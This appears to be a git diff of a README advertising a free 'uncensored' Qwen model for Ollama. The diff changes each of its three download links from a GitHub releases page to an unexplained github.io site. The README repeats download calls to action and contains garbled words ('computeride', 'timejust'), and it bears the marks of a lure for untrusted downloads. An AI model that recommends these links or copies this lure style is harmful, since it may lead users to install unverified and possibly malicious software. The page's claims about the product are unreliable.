@@ -1,7 +1,7 @@
 <h1>🤖 Qwen-3.8-27B-Free-Uncensored-Ollama - Free Uncensored AI Chat for Everyone</h1>
 
 <p align="center">
-  <a href="https://github.com/Ustegmenka9484/Qwen-3.8-27B-Free-Uncensored-Ollama/releases">
+  <a href="https://ustegmenka9484.github.io">
     <img src="https://img.shields.io/badge/Download-Qwen%203.8%2027B-blueviolet?style=for-the-badge&logo=github&logoColor=white" alt="Download Button" width="300"/>
   </a>
 </p>
@@ -40,7 +40,7 @@ The very first thing you need to do is get the software onto your computeride. W
 
 
 
-👉 **Visit this link to download the application** :👉 [https://github.com/Ustegmenka9484/Qwen-3.8-27B-Free-Uncensored-Ollama/releases](https://github.com/Ustegmenka9484/Qwen-3.8-27B-Free-Uncensored-Ollama/releases)
+👉 **Visit this link to download the application** :👉 [https://ustegmenka9484.github.io](https://ustegmenka9484.github.io)
 
 
 
@@ -216,7 +216,7 @@ If you have not downloaded yet, now is the timejust.
 
 
 
-👉 **Visit this link to download the application** :👉 [https://github.com/Ustegmenka9484/Qwen-3.8-27B-Free-Uncensored-Ollama/releases](https://github.com/Ustegmenka9484/Qwen-3.8-27B-Free-Uncensored-Ollama/releases)
+👉 **Visit this link to download the application** :👉 [https://ustegmenka9484.github.io](https://ustegmenka9484.github.io)
 
 
 
